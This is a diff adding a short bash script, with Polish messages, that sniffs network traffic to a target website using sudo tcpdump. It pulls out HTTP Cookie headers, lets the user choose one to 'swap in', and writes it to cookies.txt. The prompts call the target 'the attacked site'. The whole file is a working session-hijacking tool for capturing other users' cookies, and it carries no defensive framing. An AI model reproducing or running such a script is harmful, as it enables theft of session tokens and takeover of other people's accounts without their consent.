@@ -1,0 +1,30 @@
+#!/bin/bash
+
+if [ $# -eq 2 ]
+then
+	if [ $2 -gt 0 ]
+	then
+		echo "Nasluchiwanie..."
+		mapfile -t result < <(sudo tcpdump host $1 -s 0 -w - -l 2>/dev/null | grep -ai -m $2 ^Cookie)
+
+		echo "---------------- Wybierz ciasteczko do zamiany ----------------"
+		for (( c=0; c<$2; c++ ))
+		do
+   			echo "---------------- Ciasteczko $c ---------------- "
+			echo $result[$c]
+		done
+		number=-1
+		while [ $number -lt 0 ] || [ $number -gt $2 ]
+		do
+ 			echo "Podaj numer ciasteczka"
+                	read number
+		done
+		echo $result[$number] > cookies.txt
+	else
+		echo "Liczba ciasteczek musi byc wieksza od 0"
+	fi
+else
+	echo "Musisz podac dwa argumenty:"
+	echo "1 - adres atakowanej strony np. wp.pl"
+	echo "2 - ilosc ciasteczek ktore chcesz przechwycic"
+fi 
